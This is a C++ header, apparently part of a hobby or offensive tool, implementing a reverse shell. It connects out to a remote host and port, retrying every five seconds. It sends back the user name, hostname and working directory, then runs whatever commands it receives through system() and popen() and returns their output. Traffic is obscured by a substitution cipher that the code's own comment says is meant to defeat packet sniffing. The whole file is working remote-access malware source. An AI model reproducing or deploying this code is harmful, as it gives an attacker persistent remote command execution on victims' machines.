#ifndef SECONDSH
#define SECONDSH
// reverse shell header file using IPV4 
// connects to shmain socket

#include <iostream>
#include <string.h>
#include <string>
#include <sys/time.h>
#include <thread>
#include <map>

//NETWORKING
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <limits.h>
#include <arpa/inet.h>
#include <netdb.h>

struct secondsh{
    int bytes_red = 0;
    int bytes_written = 0;
    int global_socket;

    std::string alphabet = "abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    std::string str = "gjewklmzusnvqpycthrifxbdao DWKISFOGNUQZXBYCEVRLMAHPJT6547812390";

    // this encryption method is designed to provide a basic layer of security against packet sniffing
    // without encryption everyone could see the data sent (which includes password)
    std::string ncrypt(std::string target){
        std::string encrypted;
        std::map <char, char> nmap;
        int pos = 0;

        for(char c : alphabet){
            nmap[c] = str.at(pos);
            pos++;
            
        }
        const char* quote = "'";
        for(char l : target){
            if((int) nmap[l] == 0 && l != *quote){encrypted.push_back(l);}

            else{encrypted.push_back(nmap[l]);}
            
        }
        return encrypted;

    }

    std::string dcrypt(std::string target){
        std::string decrypted;
        std::map <char, char> nmap;
        int pos = 0;

        for(char c : str){
            nmap[c] = alphabet.at(pos);
            pos++;
            
        }

        const char* quote = "'";
        for(char l : target){

            if((int)l == 0){decrypted.push_back(*quote);}

            else if((int) nmap[l] == 0){decrypted.push_back(l);}
            
            else{decrypted.push_back(nmap[l]);} 
        }

        return decrypted;
    
    }

    std::string system_output(std::string cmd) {
        std::string data;
        FILE * stream;
        const int max_buffer = 256;
        char buffer[max_buffer];
        cmd.append(" 2>&1");

        stream = popen(cmd.c_str(), "r");
        if (stream){
        while (!feof(stream)){
            if(fgets(buffer, max_buffer, stream) != NULL){ data.append(buffer);}
        }
        pclose(stream);
            
        }
        return data;
 
    }

    int* connect_socket(unsigned int PORT, const std::string hostname){
        char buffer[1500];

        struct hostent* host = gethostbyname(hostname.c_str()); 
        sockaddr_in send_sock_addr;   
        bzero((char*)&send_sock_addr, sizeof(send_sock_addr)); 
        send_sock_addr.sin_family = AF_INET; //IPV4
        send_sock_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)*host->h_addr_list)); // inet_ntoa converts host address in network bytes
        send_sock_addr.sin_port = htons(PORT); // makes sure that numbers are stored in memory in network byte order

        int client_sd = socket(AF_INET, SOCK_STREAM, 0);
        int* ptr_clientsd = &client_sd;
        global_socket = client_sd;
        //try to connect...
        int bind_status = connect(client_sd, (sockaddr*) &send_sock_addr, sizeof(send_sock_addr));
        if(bind_status < 0){
            std::chrono::seconds duration(5);
            std::this_thread::sleep_for(duration);
            connect_socket(PORT, hostname);
        }

        struct timeval start1, end1;
        gettimeofday(&start1, NULL);

        std::string whoami = ncrypt(system_output("whoami"));

        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
        strcpy(buffer, whoami.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);

        std::string chostname = ncrypt(system_output("hostname"));
        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
        strcpy(buffer, chostname.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);

        std::string current_dir = ncrypt(system_output("echo $PWD"));
        memset(&buffer, 0x00, sizeof(buffer));
        strcpy(buffer, current_dir.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0); //sending current_dir

        return ptr_clientsd;

    }

    void connectsh(int* socket){
        char buffer[1500];
        
        while(true){
            memset(&buffer, 0x00, sizeof(buffer));
            int read = recv(global_socket, (char*)&buffer, sizeof(buffer), 0); // read command
            bytes_red += read;

            // decrypt buffer
            std::string newbuff = dcrypt(std::string(buffer));
            memset(&buffer, 0x00, sizeof(buffer));
            strcpy(buffer, newbuff.c_str());

            std::string s_buffer = std::string(buffer);
            std::string token = s_buffer.substr(0, s_buffer.find(" "));
            

            if(read < 0){
                printf("recv error: %s\n", strerror(errno));
            }

            else if(!strcmp(buffer, "disconnect")){
                close(global_socket);
                exit(1);
            }
            
            system(buffer);
            std::string cmd_out = system_output(std::string(buffer));
            std::string crypt_out = ncrypt(cmd_out);
            //std::cout << buffer << std::endl;
            strcpy(buffer, crypt_out.c_str());
            bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
     
        }


    }

};

#endif
